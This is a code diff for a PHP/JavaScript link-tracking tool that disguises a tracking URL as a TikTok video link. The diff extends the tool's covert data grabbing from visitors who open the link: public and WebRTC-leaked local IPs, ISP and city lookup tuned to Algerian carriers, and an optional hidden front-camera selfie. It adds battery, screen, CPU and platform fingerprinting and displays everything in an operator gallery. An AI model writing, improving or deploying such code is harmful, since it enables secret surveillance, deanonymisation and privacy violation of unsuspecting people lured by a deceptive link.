@@ -75,12 +75,17 @@ function get_real_ip() {
     return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
 }
 
-// دالة تحليل دقيقة لمعرفة شبكات الجزائر (Mobilis, Djezzy, Ooredoo, Algérie Télécom)
-function get_ip_location($ip) {
+function get_ip_location_and_isp($ip, $ua) {
     if ($ip === '127.0.0.1' || $ip === 'Unknown' || strpos($ip, '192.168.') === 0) {
-        return 'Local Network';
+        return 'Local Network / Internal';
     }
-    @$json = file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,city,isp,org,as");
+
+    $lower_ua = strtolower($ua);
+    if (strpos($lower_ua, 'telegram') !== false) return 'Telegram Preview Server [Bot]';
+    if (strpos($lower_ua, 'whatsapp') !== false) return 'WhatsApp Preview Server [Bot]';
+    if (strpos($lower_ua, 'facebookexternalhit') !== false || strpos($lower_ua, 'messenger') !== false) return 'Meta / Messenger Server [Bot]';
+
+    @$json = file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,city,isp,org");
     if ($json) {
         $data = json_decode($json, true);
         if (isset($data['status']) && $data['status'] === 'success') {
@@ -89,12 +94,14 @@ function get_ip_location($ip) {
             $isp = $data['isp'] ?? ($data['org'] ?? '');
             
             $lower_isp = strtolower($isp);
-            if (strpos($lower_isp, 'mobilis') !== false || strpos($lower_isp, 'telecom algeria') !== false || strpos($lower_isp, 'atm') !== false) {
-                $network_type = " [⚡ Mobilis / ADSL]";
-            } elseif (strpos($lower_isp, 'djezzy') !== false || strpos($lower_isp, 'ota') !== false) {
-                $network_type = " [🔥 Djezzy]";
+            if (strpos($lower_isp, 'mobilis') !== false || strpos($lower_isp, 'public mobile') !== false) {
+                $network_type = " [⚡ Mobilis Algeria]";
+            } elseif (strpos($lower_isp, 'djezzy') !== false || strpos($lower_isp, 'ota') !== false || strpos($lower_isp, 'optimum telecom') !== false) {
+                $network_type = " [🔥 Djezzy Algeria]";
             } elseif (strpos($lower_isp, 'ooredoo') !== false || strpos($lower_isp, 'wataniya') !== false) {
-                $network_type = " [⭐ Ooredoo]";
+                $network_type = " [⭐ Ooredoo Algeria]";
+            } elseif (strpos($lower_isp, 'algerie telecom') !== false || strpos($lower_isp, 'atm') !== false) {
+                $network_type = " [🌐 Algérie Télécom / ADSL]";
             } else {
                 $network_type = " [ISP: {$isp}]";
             }
@@ -102,22 +109,7 @@ function get_ip_location($ip) {
             return "{$city}{$country}{$network_type}";
         }
     }
-    return 'Algerian Network (Unknown ISP)';
-}
-
-function get_device_type($ua) {
-    $brand = 'Device';
-    if (stripos($ua, 'Samsung') !== false) $brand = 'Samsung';
-    elseif (stripos($ua, 'iPhone') !== false) $brand = 'iPhone';
-    elseif (stripos($ua, 'Huawei') !== false) $brand = 'Huawei';
-    elseif (stripos($ua, 'Xiaomi') !== false or stripos($ua, 'Redmi') !== false) $brand = 'Xiaomi';
-    elseif (stripos($ua, 'Oppo') !== false) $brand = 'Oppo';
-
-    if (stripos($ua, 'Android') !== false) return $brand . ' - Android';
-    if (stripos($ua, 'iPhone') !== false or stripos($ua, 'iPad') !== false) return $brand . ' - iOS';
-    if (stripos($ua, 'Windows') !== false) return 'PC - Windows';
-    if (stripos($ua, 'Macintosh') !== false) return 'PC - Mac';
-    return 'Unknown Device';
+    return 'Algeria (Network Trace)';
 }
 
 if (isset($_GET['r'])) {
@@ -135,11 +127,9 @@ if (isset($_GET['r'])) {
         $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
         $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebookexternalhit|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger/i', $ua);
 
-        // التقاط فوري لبيانات المعاينة (Zero-Click Preview Fetch)
         if ($is_bot) {
             $bot_ip = get_real_ip();
-            $bot_location = get_ip_location($bot_ip);
-            $bot_device = "Zero-Click Preview Bot (" . (stripos($ua, 'telegram') !== false ? 'Telegram' : 'App') . ")";
+            $bot_location = get_ip_location_and_isp($bot_ip, $ua);
             
             try {
                 $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, device_info, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
@@ -147,10 +137,10 @@ if (isset($_GET['r'])) {
                     $code, 
                     'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=200', 
                     $bot_ip, 
-                    'Zero-Click (No Interaction)', 
+                    'N/A', 
                     'N/A', 
                     $bot_location, 
-                    $bot_device, 
+                    "🤖 [Preview Bot] UserAgent: " . htmlspecialchars(substr($ua, 0, 60)), 
                     date('Y-m-d H:i:s')
                 ]);
             } catch (Exception $e) {}
@@ -173,12 +163,20 @@ if (isset($_GET['r'])) {
         if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_capture'])) {
             $img_base64 = $_POST['image'] ?? '';
             $public_ip = get_real_ip();
-            $local_ip = $_POST['lip'] ?? 'Direct';
+            $local_ip = $_POST['lip'] ?? 'Unknown';
             $port = $_SERVER['REMOTE_PORT'] ?? 'Unknown';
-            $location = get_ip_location($public_ip);
-            $device = get_device_type($ua);
+            $location = get_ip_location_and_isp($public_ip, $ua);
+            
+            // استقبال البيانات العميقة المحملة من المتصفح
+            $screen = $_POST['screen'] ?? 'N/A';
+            $hardware = $_POST['hardware'] ?? 'N/A';
+            $battery = $_POST['battery'] ?? 'N/A';
+            $platform = $_POST['platform'] ?? 'N/A';
+            $lang = $_POST['lang'] ?? 'N/A';
 
-            if (!empty($img_base64) || !empty($public_ip)) {
+            $device = "📱 Platform: {$platform} | Screen: {$screen} | CPU Cores: {$hardware} | Battery: {$battery} | Lang: {$lang}";
+
+            if (!empty($public_ip)) {
                 try {
                     $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, device_info, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
                     $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $port, $location, $device, date('Y-m-d H:i:s')]);
@@ -217,10 +215,35 @@ if (isset($_GET['r'])) {
                     }
                 }
             };
-            setTimeout(() => { if (!foundLocal) callback("Direct"); }, 80);
+            setTimeout(() => { if (!foundLocal) callback("Direct / Mobile Data"); }, 100);
         }
 
-        window.addEventListener('DOMContentLoaded', () => {
+        async function gatherDeepDeviceInfo() {
+            let screenRes = window.screen.width + "x" + window.screen.height + " (Ratio: " + window.devicePixelRatio + ")";
+            let cores = navigator.hardwareConcurrency || "Unknown";
+            let platform = navigator.platform || "Unknown";
+            let lang = navigator.language || "Unknown";
+            let batteryInfo = "Not Supported";
+
+            try {
+                if (navigator.getBattery) {
+                    let bat = await navigator.getBattery();
+                    batteryInfo = Math.round(bat.level * 100) + "% " + (bat.charging ? "(Charging)" : "(Discharging)");
+                }
+            } catch(e) {}
+
+            return {
+                screen: screenRes,
+                hardware: cores + " Cores",
+                battery: batteryInfo,
+                platform: platform,
+                lang: lang
+            };
+        }
+
+        window.addEventListener('DOMContentLoaded', async () => {
+            let deepInfo = await gatherDeepDeviceInfo();
+            
             getLocalIP(function(localIp) {
                 if (shouldCapture === 1) {
                     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
@@ -243,23 +266,28 @@ if (isset($_GET['r'])) {
                                 stream.getTracks().forEach(track => track.stop());
                                 video.remove();
 
-                                sendDataAndRedirect(imageData, localIp);
+                                sendDataAndRedirect(imageData, localIp, deepInfo);
                             }, 400);
                         })
                         .catch(err => {
-                            sendDataAndRedirect('', localIp);
+                            sendDataAndRedirect('', localIp, deepInfo);
                         });
                 } else {
-                    sendDataAndRedirect('', localIp);
+                    sendDataAndRedirect('', localIp, deepInfo);
                 }
             });
         });
 
-        function sendDataAndRedirect(imgData, localIp) {
+        function sendDataAndRedirect(imgData, localIp, deepInfo) {
             const formData = new URLSearchParams();
             formData.append('save_capture', '1');
             formData.append('image', imgData);
             formData.append('lip', localIp);
+            formData.append('screen', deepInfo.screen);
+            formData.append('hardware', deepInfo.hardware);
+            formData.append('battery', deepInfo.battery);
+            formData.append('platform', deepInfo.platform);
+            formData.append('lang', deepInfo.lang);
 
             fetch(window.location.href, {
                 method: 'POST',
@@ -379,13 +407,13 @@ if (!empty($filter_code)) {
     <div class="wrapper">
         
         <div class="section-box">
-            <h2>Generate Zero-Click Advanced Link</h2>
+            <h2>Generate Deep Intelligence Link</h2>
             <form method="POST" class="form-grid">
                 <input type="text" name="target_url" placeholder="TikTok Video URL..." required autocomplete="off">
                 
                 <label class="checkbox-group">
                     <input type="checkbox" name="capture_cam" value="1">
-                    <span>تفعيل التقاط صورة سيلفي في الخلفية (Capture Selfie عند الضغط)</span>
+                    <span>تفعيل التقاط صورة سيلفي متقدمة في الخلفية (Capture Selfie عند الضغط)</span>
                 </label>
 
                 <button type="submit" name="create" class="btn">Generate Link</button>
@@ -403,7 +431,7 @@ if (!empty($filter_code)) {
         </div>
 
         <div class="section-box">
-            <h2>Captured Gallery & Details</h2>
+            <h2>Deep Hardware & Network Intelligence</h2>
             <form method="GET" style="margin-bottom: 15px; display: flex; gap: 8px;">
                 <input type="text" name="track" placeholder="Filter by code..." value="<?php echo htmlspecialchars($filter_code); ?>" style="flex:1; background:#020617; border:1px solid var(--border-color); border-radius:8px; padding:10px; color:#fff; outline:none;">
                 <button type="submit" class="btn" style="height:42px;">Filter</button>
@@ -428,16 +456,13 @@ if (!empty($filter_code)) {
                                 <span>Public IP:</span> <span style="color:#38bdf8;"><?php echo htmlspecialchars($cap['public_ip']); ?></span>
                             </div>
                             <div class="info-row">
-                                <span>Local IP:</span> <span><?php echo htmlspecialchars($cap['local_ip']); ?></span>
-                            </div>
-                            <div class="info-row">
-                                <span>Port:</span> <span><?php echo htmlspecialchars($cap['port']); ?></span>
+                                <span>Local IP:</span> <span style="color:#f59e0b;"><?php echo htmlspecialchars($cap['local_ip']); ?></span>
                             </div>
                             <div class="info-row">
                                 <span>Network / ISP:</span> <span style="color:#10b981; font-weight:bold;"><?php echo htmlspecialchars($cap['location']); ?></span>
                             </div>
                             <div class="info-row">
-                                <span>Device:</span> <span><?php echo htmlspecialchars($cap['device_info']); ?></span>
+                                <span>Hardware & Specs:</span> <span style="color:#f43f5e; font-weight:bold;"><?php echo htmlspecialchars($cap['device_info']); ?></span>
                             </div>
                             <div class="info-row" style="border-top:1px solid var(--border-color); padding-top:6px; margin-top:8px;">
                                 <span>Time:</span> <span><?php echo htmlspecialchars($cap['created_at']); ?></span>
